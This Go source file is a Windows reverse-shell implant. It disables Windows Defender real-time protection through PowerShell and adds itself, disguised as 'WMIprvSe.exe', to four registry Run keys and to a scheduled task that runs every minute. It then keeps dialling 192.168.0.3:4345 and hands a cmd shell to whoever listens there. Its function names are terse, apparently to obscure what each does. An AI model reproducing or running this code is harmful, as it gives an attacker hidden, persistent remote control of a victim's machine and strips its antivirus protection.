package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

var (
	a1 = "192.168.0.3"
	a2 = 4345
)

const (
	registry_RUN            = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
	registry_RunOnce        = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
	registry_RunServices    = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`
	registry_RunServiceOnce = `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
)

func d1() {
	c := exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	output, err := c.CombinedOutput()
	if err != nil {
		fmt.Println("[-] You need to run with Administrator rights")
	} else {
		fmt.Println(string(output))
	}
}

func d2() {
	command := func(registry string) {
		pth, err := os.Getwd()
		if err != nil {
			fmt.Println("[-] Error getting current directory:", err)
		}
		pth = pth + "\\WMIprvSe.exe"
		c := exec.Command("cmd", "/C", "reg", "add", registry, "/v", "PentestPersist", "/t", "REG_SZ", "/d", pth)
		if err := c.Run(); err != nil {
			fmt.Println("Error: ", err)
		} else {
			fmt.Println("[+] Successful add to", registry, "[+]")
		}
	}
	go command(registry_RUN)
	go command(registry_RunOnce)
	go command(registry_RunServices)
	go command(registry_RunServiceOnce)
}

func d3() {
	command := func() {
		pth, err := os.Getwd()
		if err != nil {
			fmt.Println("[-] Error getting current directory:", err)
		}
		pth = pth + "\\WMIprvSe.exe"
		c := exec.Command("cmd", "/C", "SCHTASKS", "/Create", "/SC", "MINUTE", "/TN", "spawn", "/TR", pth)
		if err := c.Run(); err != nil {
			fmt.Println("Error: ", err)
		} else {
			fmt.Println("[+] Successful add to Schedule(SCHTASKS)", "[+]")
		}
	}
	go command()
}

func e1() {
	if a1 == "0.0.0.0" || a2 == 0 {
		fmt.Fprintln(os.Stderr, "[ERROR] a1 and/or a2 not defined.")
		os.Exit(1)
	}
}

func e2() net.Conn {
	var c net.Conn
	var err error
	for {
		c, err = net.Dial("tcp", fmt.Sprintf("%s:%d", a1, a2))
		if err == nil {
			break
		}
		time.Sleep(5 * time.Second)
	}
	return c
}

func e3(c net.Conn) {
	cmd := exec.Command("cmd")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	err := cmd.Start()
	if err != nil {
		fmt.Fprintln(os.Stderr, "[ERROR] cmd start failed:", err)
		os.Exit(1)
	}
	cmd.Wait()
}

func main() {
	d1()
	d2()
	d3()
	e1()
	c := e2()
	e3(c)
}
